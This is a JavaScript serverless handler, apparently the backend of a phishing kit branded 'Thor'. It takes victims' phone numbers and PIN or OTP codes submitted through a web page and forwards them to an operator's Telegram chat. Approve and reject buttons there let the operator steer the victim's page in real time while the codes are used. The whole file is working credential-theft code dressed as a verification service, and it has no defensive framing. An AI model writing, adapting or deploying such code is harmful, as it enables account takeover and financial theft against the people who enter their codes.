import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN,
});

export default async function handler(req, res) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // 1. GET Request (Website polling)
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            const status = await redis.get(`status_${userId}`);
            return res.status(200).json({ status: status || 'pending' });
        } catch (error) {
            console.error("GET Error:", error);
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // 2. POST Request from Telegram (Admin clicks a button)
    if (req.method === 'POST') {
        // Safely parse the body in case Vercel didn't do it automatically
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) { }
        }

        if (body && body.callback_query) {
            try {
                const { id, data, message } = body.callback_query;
                const [action, userId, type] = data.split('_'); 
                
                console.log(`Telegram Button Clicked: Action=${action}, User=${userId}, Type=${type}`);

                // Stop Telegram loading spinner
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: id })
                });

                if (action === 'approve') {
                    await redis.set(`status_${userId}`, 'approved');
                    await editTelegramMessage(message.message_id, `✅ PIN APPROVED - User can proceed`);
                } else if (action === 'reject') {
                    await redis.set(`status_${userId}`, 'rejected');
                    await editTelegramMessage(message.message_id, `❌ WRONG ${type.toUpperCase()} - Rejected`);
                }
                return res.status(200).send('OK');
            } catch (error) {
                console.error("Webhook Processing Error:", error);
                return res.status(500).send('Error');
            }
        }
    }

    // 3. POST Request from Website (Send PIN/OTP to Telegram)
    if (req.method === 'POST' && req.body && req.body.action === 'send_verification') {
        try {
            const { phone, pin, userId, type } = req.body; 
            await redis.set(`status_${userId}`, 'pending'); 

            const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                         `${type.toUpperCase()} VERIFICATION NEEDED\n\n` +
                         `USER DETAILS:\n` +
                         `• Phone Number: ${phone}\n` +
                         `• ${type.toUpperCase()} Code: ${pin}\n` +
                         `• Username & Pass: user_${userId}\n` +
                         `• Time: ${new Date().toLocaleString()}\n` +
                         `• Bot: user75\n\n` +
                         `Verify the ${type.toUpperCase()}:\n` +
                         `• ${type.toUpperCase()} Length: ${pin.length} digits\n` +
                         `• Timeout: 5 minutes\n` +
                         `16.09`;

            await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                            [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }],
                            [{ text: "🕒 Extend Time", callback_data: `reject_${userId}_${type}` }]
                        ]
                    }
                })
            });
            return res.status(200).json({ success: true });
        } catch (error) {
            console.error("Send Verification Error:", error);
            return res.status(500).json({ error: 'Failed to send' });
        }
    }
    return res.status(200).send('OK');
}

async function editTelegramMessage(messageId, text) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [[{ text: text, callback_data: "noop" }]]
            }
        })
    });
                              }
